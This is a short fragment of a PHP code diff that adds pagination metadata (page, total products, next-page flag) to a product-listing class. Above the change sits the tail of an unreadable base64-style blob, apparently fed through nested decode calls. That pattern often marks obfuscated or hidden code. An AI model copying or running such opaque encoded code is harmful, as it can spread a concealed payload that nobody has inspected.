akQ95ZdJ9pGAqXfYPVb4pU5OTxO5zwxpT8MObd1OX/QQHnFguRZ5uZiezztN0hwvJrIZG8zUbVxRacMwlzs21pQZif8R0qSTUbLLCRs3GPVBJN6BMWdVC9liPsg2oVCQfRRu7+3clp/00JjNKp3URxWFOPdlP4GHQPndnNHNaxZfJx1ziiH2dFWU6ufsxgppT6d7nGDSB0DPTZutMvqtLeXz5boia2ZnnHKJWjPyajgasj4tG9HkNWweMQh95v1YiPByeyTQi86kOX75VaxeGjysKljFZemOSLbNcdT/6jOdCX9uVxUywg+mAWi0erNt0aetXXsPd/3Aq3J/w3M+i/Ubd6///U8//4v')))));
 
+		if(isset($this -> html['totalCount'])){
+			$results['meta']['page'] = $page;
+			$results['meta']['totalProducts'] = $this -> html['totalCount'];
+			$results['meta']['nextPageAvailable'] = $skip + 100 > $results['meta']['totalProducts'] ? false : true;
+		}
 
 		if(isset($_GET['advance'])){
 			$results['categoryName'] = $this -> html['categoryName'];
